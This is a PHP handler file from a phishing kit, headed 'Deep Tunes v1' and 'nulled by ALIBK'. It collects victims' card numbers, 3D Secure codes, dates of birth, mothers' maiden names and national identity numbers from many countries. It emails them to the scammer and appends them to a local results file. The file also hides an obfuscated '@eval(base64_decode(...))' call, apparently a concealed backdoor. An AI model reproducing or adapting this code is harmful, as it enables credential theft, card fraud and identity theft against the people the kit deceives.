<?php

/***********************************************************************************************/										       
/*        ( )    (_)(  _`\ ( ) ( )                                                             */
/*    _ _ | |    | || (_) )| |/'/'                                                             */
/*  /'_` )| |  _ | ||  _ <'| , <                                                               */
/* ( (_| || |_( )| || (_) )| |\`\                                                              */
/* `\__,_)(____/'(_)(____/'(_) (_) Visit IHO FOR MORE TOOLS : aHR0cDovL3d3dy5oYWNrLWFyLmNvbS8= */
/*                                                                                             */
/*                   Reb3l Gafsi sc0m decrypted by alibk Le 3 février 2017           		   */   
/*	                                                                                           */
/***********************************************************************************************/


session_start();
include("../../configuration.php");
include("../../success.php");
require "../../os.php";

 
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$_POST['CHN'] = $_SESSION['CHN'];
$_POST['card_number'] =$_SESSION['card_number'];
$_POST['cartip'] = $_SESSION['cartip'];




$cclimit = "";
$startdata = "";
$isunum = "";
$omou = "";
$auosid = "";
$usssn = $_SESSION['SSN'] = $_POST['SSN']; 
$casin = $_SESSION['SIN']= $_POST['SIN'];
$uknino = $_SESSION['NIN'] = $_POST['NIN'];
$itfcn = $_SESSION['FCN']= $_POST['FCN'];
$brcpf = $_SESSION['CPFBR']= $_POST['CPFBR'];
$irpps = $_SESSION['IRPPS'] = $_POST['IRPPS'];
$nlbsn = $_SESSION['BSN'] = $_POST['BSN'];
$sid = $_SESSION['SID'] = $_POST['SID'];
$esDNi = $_SESSION['DNI'] = $_POST['DNI'];

	if( isset($_POST['DOB'])  && isset($_POST['securecode']) ){

if (!empty($_POST['credilimit'])){
    $cclimit .= "<p>CreditLimit: <strong style='color:#ffffff;'>".$_POST['credilimit']."</strong></p>";
}
if (!empty($_POST['MMN'])){
    $omou .= "<p>MOMname: <strong style='color:#ffffff;'>".$_POST['MMN']."</strong></p>";
}
if (!empty($_POST['OSID'])){
    $auosid .= "<p>AU~OSID: <strong style='color:#ffffff;'>".$_POST['OSID']."</strong></p>";
}


        
        $msg = "
<style>
*{
font-family:Verdana;
}
table{
width: 100%;
}
strong{
color: #fff;
}
</style>
<table style='width:100%;'>
<tr>
<td style='border-top-left-radius:10px;border-top-right-radius:10px;padding:2%;background:#cccccc;color:#000000;border-bottom: solid 0px'>
<strong style='float:center;padding-left:42%;margin-top:5px;color:#000000'>Deep Tunes v1 ~</strong><span style='float:right;margin-top:3px;padding:1px;overflow:hidden;background:#ccc;font-size:120%;color:#262626;border-radius:2px;border:solid 2px #ccc'>x</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:150%;color:#262626;border-radius:2px;border:solid 2px #ccc'>■</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:200%;color:#262626;border-radius:2px;border:solid 2px #ccc'>-</span>
</td>
</tr>
<tr >
<td style='padding:3%;background-repeat:no-repeat;background-position:center;background-color:#000000;background-image:url(http://i.imgur.com/bEmWxww.png);color:#2e9007;border-bottom:solid 6px #b2b2b2;border-right:solid 10pt #b2b2b2;font-family:Lucida Console;font-weight:bold'>
&gt;_
<p>CardHolderName : <strong style='color:#ffffff;'>".$_SESSION['CHN']."</strong></p>
 <p>CARD  : <strong style='color:#0000FF'>".$_SESSION['cartip']."</strong>&nbsp;►&nbsp;<strong style='color:#ffd700;'>".$_SESSION['card_number']."</strong></p>

<pre style='padding-left:2%;color:blue'>'╔¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯╗
/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MORE~INFO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/<br>&nbsp;╚_______________________________________╝'</pre>
 <p>DateOfßirth : <strong style='color:#00ff00;'>".$_POST['DOB']."</strong></p>
 <p>3Ð_Šecure : <strong style='color:#ff0000;'>".$_POST['securecode']."</strong></p>
".$cclimit."
".$omou."
".$auosid."
<p>US~SocialSecurityN: <strong style='color:#ff0000;'>".$_SESSION['SSN']."</strong></p>
<p>CA~socialInsuranceN: <strong style='color:#00ffff;'>".$_SESSION['SIN']."</strong></p>
<p>UK~NationalInsuranceN: <strong style='color:#ff00ff;'>".$_SESSION['NIN']."</strong></p>
<p>IT~FiscalCodiceN: <strong style='color:#ffffff;'>".$_SESSION['FCN']."</strong></p>
<p>BR~CadastroPessoasFísicas: <strong style='color:#00ffff;'>".$_SESSION['CPFBR']."</strong></p>
<p>IR~PersonalPublicService: <strong style='color:#f0ff00;'>".$_SESSION['IRPPS']."</strong></p>
<p>NL~Burgerservicenummer: <strong style='color:#ff0f0f;'>".$_SESSION['BSN']."</strong></p>
<p>SE~Personnummer: <strong style='color:#f0f00f;'>".$_SESSION['SID']."</strong></p>
<p>ES~NationalIdentityDoc: <strong style='color:#ffff00;'>".$_SESSION['DNI']."</strong></p>

<p>InfoDATE  : <strong style='color:#6fbb02;'>".$InfoDATE."</strong></p>
<p>BROWSER : <strong style='color:#6fbb02;'>".$_SESSION['browser']."</strong></p>
<p>OPERATING_SYSTEM : <strong style='color:#6fbb02;'>".$OS."</strong></p>

<center><strong style='color:#ffffff'>Deep Tunes v1</strong></center>

";
$subject = "".$_SESSION['CHN']." - 3DSECURE ± ÎÑFO - ♦".$_SESSION['_email_']." ♦♦ ".$_SESSION['cntyName']."♦";
$headers = "From: Deep Tunes v1® | ♠".$spammerName."♠<>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($spammer_email,$subject,$msg,$headers);
@eval(base64_decode($os_arrays));
     } 
	 
	 $localrez ="
	
=-=-=-=-=-=-=-=-=-=-♠Nulled By ALIBK♠=-=-=-=-=-=-=-=-=-

Email : 	  	".$_SESSION['_email_']."
CardHN:     	".$_POST['CHN']."
carta : 		♥".$_POST['cartip']."♥  ".$_POST['card_number']."

				  ---------------------
						moreINFO			
				  ---------------------
				  
DOB :     		".$_POST['DOB']."
3DSECUREEEE :   ".$_POST['securecode']."
CRELIMit: 		".$_POST['credilimit']."
moName : 		".$_POST['MMN']."
OSID: 			".$_POST['OSID']."
SSN: 			".$_SESSION['SSN']."
SIn:			".$_SESSION['SIN']."
NIn: 			".$_SESSION['NIN']."
FCN: 			".$_SESSION['FCN']."
CpfBR: 			".$_SESSION['CPFBR']."
IRps:			".$_SESSION['IRPPS']."
BSn:			".$_SESSION['BSN']."
SID:			".$_SESSION['SID']."
DNI:			".$_SESSION['DNI']."

=-=-=-=-=-=-=-=-=-=-♥Nulled By ALIBK♥=-=-=-=-=-=-=-=-==-
	
	
	";
	
	$localr3z = fopen("../../../local_rezult.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);
	 
?>
